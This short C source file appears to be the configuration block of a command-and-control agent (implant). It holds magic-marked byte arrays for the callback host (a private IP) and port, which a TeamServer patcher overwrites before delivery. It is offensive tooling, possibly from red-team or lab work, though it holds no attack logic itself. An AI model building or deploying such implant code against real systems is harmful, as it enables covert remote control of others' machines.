#include "AgentConfig.h"

// Configuration block patched by the TeamServer before delivery.
//
// Layout per array:
//   [0..7]   8-byte magic marker   — used by the patcher to locate the field
//   [8..]    null-terminated string — the actual runtime value
//
// Do NOT change the magic bytes; the Python patcher relies on them verbatim.

// Host field — magic 0xDEADBEEFC2C2C2C2 + up to 63-char hostname/IP + null
volatile char AGENT_C2_HOST_CFG[72] = {
    '\xDE', '\xAD', '\xBE', '\xEF', '\xC2', '\xC2', '\xC2', '\xC2',
    '1', '7', '2', '.', '1', '6', '.', '9', '7', '.', '1', '\x00'
    // bytes [20..71] are implicitly zero (null padding)
};

// Port field — magic 0xDEADBEEFC2C2C2C3 + up to 5-digit port number as ASCII + null
volatile char AGENT_C2_PORT_CFG[16] = {
    '\xDE', '\xAD', '\xBE', '\xEF', '\xC2', '\xC2', '\xC2', '\xC3',
    '8', '0', '8', '0', '\x00'
    // bytes [13..15] are implicitly zero
};
